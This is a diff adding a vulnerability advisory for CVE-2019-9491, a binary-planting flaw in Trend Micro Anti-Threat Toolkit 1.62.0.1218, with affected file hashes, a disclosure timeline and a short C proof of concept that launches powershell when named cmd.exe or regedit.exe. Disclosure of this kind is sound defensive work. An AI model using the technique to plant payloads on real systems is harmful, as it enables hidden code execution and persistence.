@@ -1,0 +1,112 @@
+# Exploit Title: Trend Micro Anti-Threat Toolkit 1.62.0.1218 - Remote Code Execution
+# Date: 2019-10-19
+# Exploit Author: hyp3rlinx
+# Vendor Homepage: www.trendmicro.com
+# Version: 1.62.0.1218 and below
+# Tested on: Microsoft Windows
+# CVE: N/A
+
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/TREND-MICRO-ANTI-THREAT-TOOLKIT-(ATTK)-REMOTE-CODE-EXECUTION.txt
+[+] ISR: Apparition Security          
+ 
+
+[Vendor]
+www.trendmicro.com
+
+
+[Product]
+Trend Micro Anti-Threat Toolkit (ATTK)
+1.62.0.1218 and below
+
+Trend Micro Anti-Threat Toolkit (ATTK) can analyze malware issues and clean infections.
+It can be used to perform system forensic scans and clean the following infection types:
+
+General malware infection
+Master boot record Infection
+CIDOX/ RODNIX infection
+Rootkit infection
+Zbot infection
+Cryptolocker infection
+etc..
+
+
+[Vulnerability Type]
+Remote Code Execution
+
+
+[CVE Reference]
+CVE-2019-9491
+
+
+[Security Issue]
+Trend Micro Anti-Threat Toolkit (ATTK) will load and execute arbitrary .EXE files if a malware author
+happens to use the vulnerable naming convention of "cmd.exe" or "regedit.exe" and the malware can be
+placed in the vacinity of the ATTK when a scan is launched by the end user.
+
+Since the ATTK is signed by verified publisher and therefore assumed trusted any MOTW security warnings
+are bypassed if the malware was internet downloaded, also it can become a persistence mechanism as
+each time the Anti-Threat Toolkit is run so can an attackers malware.
+
+Standalone affected components of ATTK and other integrations (e.g. WCRY Patch Tool, OfficeScan Toolbox, etc.)
+
+attk_collector_cli_x64.exe 
+Hash: e8503e9897fd56eac0ce3c3f6db24fb1
+
+TrendMicroRansomwareCollector64.r09.exe
+Hash: 798039027bb4363dcfd264c14267375f
+
+attk_ScanCleanOnline_gui_x64.exe
+Hash: f1d2ca4b14368911c767873cdbc194ed
+
+
+[References]
+https://success.trendmicro.com/solution/000149878
+*All versions of the ATTK have been updated with the newer version. Anti-Threat Toolkit (ATTK) 1.62.0.1223
+
+
+[Exploit/POC]
+Compile an .EXE using below "C" code and use naming convention of "cmd.exe" or "regedit.exe".
+Run the Anti-Threat Toolkit and watch the ATTK console to see the Trojan file get loaded and executed.
+
+#include <windows.h>
+
+void main(void){
+   puts("Trend Micro Anti-Threat Toolkit PWNED!");
+   puts("Discovery: hyp3rlinx");
+   puts("CVE-2019-9491\n");
+   WinExec("powershell", 0);
+}
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=HBrRVe8WCHs
+
+
+[Network Access]
+Remote
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+Vendor Notification: September 9, 2019
+Vendor confirms vulnerability: September 25, 2019
+Vendor requests to coordinate advisory: September 25, 2019
+October 19, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
